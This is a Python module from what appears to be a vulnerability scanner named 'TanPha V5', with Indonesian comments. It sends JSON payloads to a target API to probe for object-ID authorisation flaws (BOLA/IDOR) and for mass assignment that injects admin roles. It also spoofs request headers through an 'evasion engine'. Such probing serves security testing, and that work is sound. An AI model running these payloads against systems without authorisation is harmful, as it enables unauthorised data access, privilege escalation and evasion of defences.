"""API Fuzzer Module for TanPha V5. Focuses on BOLA/IDOR and Mass Assignment."""
import json
from modules.base import BaseModule
from core.context import TargetContext, Evidence, Finding
from core.verification import VerificationResult, VerificationStatus
from core.evasion_engine import EvasionEngine

class APIFuzzerModule(BaseModule):
    name = "APIFuzzer"
    module_id = "api_fuzzer"
    version = "1.0 (BOLA & Mass Assignment)"
    vulnerability_class = "API_MISCONFIGURATION"
    default_impact = "DATA_LEAK"
    default_privilege = "USER"

    def __init__(self):
        super().__init__()
        # Default evasion untuk API
        self.evasion = EvasionEngine(level=1, db_type="mysql")

    def can_run(self, context: TargetContext) -> bool:
        # Paksa jalan kalau modulnya dipanggil
        return True

    def _send_json_payload(self, context, url, payload_dict, auth_checker=None, timeout=15):
        """Helper buat nembak JSON."""
        headers = {"Content-Type": "application/json", "Accept": "application/json"}
        headers.update(self.evasion.get_spoofed_headers())

        try:
            res_obj = context.http_client.request(
                "POST", url,
                json=payload_dict, headers=headers,
                auth_checker=auth_checker, timeout=timeout
            )
            return res_obj.response if res_obj and res_obj.success else None
        except Exception:
            return None

    def assess(self, context: TargetContext, auth_checker=None) -> list:
        evidence_pool = []
        target_url = context.target.base_url
        
        # 1. Payload BOLA / IDOR: Coba akses ID lain
        print(f"      [>] Testing BOLA/IDOR on '{target_url}'...")
        id_payloads = [
            {"id": 2, "user_id": 2}, 
            {"id": "2"}, 
            {"user_id": "2"},
            {"account_id": 2}
        ]
        
        for payload in id_payloads:
            res = self._send_json_payload(context, target_url, payload, auth_checker)
            if res and res.status_code in (200, 201):
                print(f"          [DEBUG] Payload {payload} -> Status: {res.status_code} | Len: {len(res.text)}")
                evidence_pool.append(Evidence(
                    attempt_id=f"bola_{list(payload.keys())[0]}",
                    module_id=self.module_id, module_version=self.version,
                    location=target_url, parameter=list(payload.keys())[0], 
                    outcome="OBSERVED", reason_code="BOLA_POTENTIAL",
                    reason_detail=f"HTTP {res.status_code} with payload {json.dumps(payload)}",
                    confidence=0.4, evidence_text="BOLA potential detected",
                    assess_payload=json.dumps(payload)
                ))
                break # Udah nemu satu, ganti ke Mass Assignment

        # 2. Payload Mass Assignment: Nyuntik role admin
        print(f"      [>] Testing Mass Assignment on '{target_url}'...")
        mass_assign_payloads = [
            {"username": "test", "role": "admin", "is_admin": True},
            {"email": "test@test.com", "admin": 1},
            {"user": {"name": "test", "privilege": "superuser"}}
        ]
        
        for payload in mass_assign_payloads:
            res = self._send_json_payload(context, target_url, payload, auth_checker)
            if res and res.status_code in (200, 201):
                print(f"          [DEBUG] Payload MassAssign -> Status: {res.status_code} | Len: {len(res.text)}")
                evidence_pool.append(Evidence(
                    attempt_id="mass_assign",
                    module_id=self.module_id, module_version=self.version,
                    location=target_url, parameter="body",
                    outcome="OBSERVED", reason_code="MASS_ASSIGNMENT_POTENTIAL",
                    reason_detail=f"HTTP {res.status_code} with payload {json.dumps(payload)}",
                    confidence=0.5, evidence_text="Mass Assignment potential detected",
                    assess_payload=json.dumps(payload)
                ))
                break
        
        return evidence_pool

    def verify(self, context: TargetContext, evidence: Evidence, auth_checker=None) -> VerificationResult:
        # Verifikasi BOLA / Mass Assignment butuh manual review
        if evidence.reason_code in ["BOLA_POTENTIAL", "MASS_ASSIGNMENT_POTENTIAL"]:
            return VerificationResult(
                VerificationStatus.INCONCLUSIVE, 0.5, 
                "NEEDS_MANUAL_REVIEW", 
                f"API responded with {evidence.reason_detail}. Check if data actually leaked or privilege escalated.",
                verify_payload=evidence.assess_payload
            )
        
        return VerificationResult(VerificationStatus.REJECTED, 0.0, "FAILED", "Not vuln")
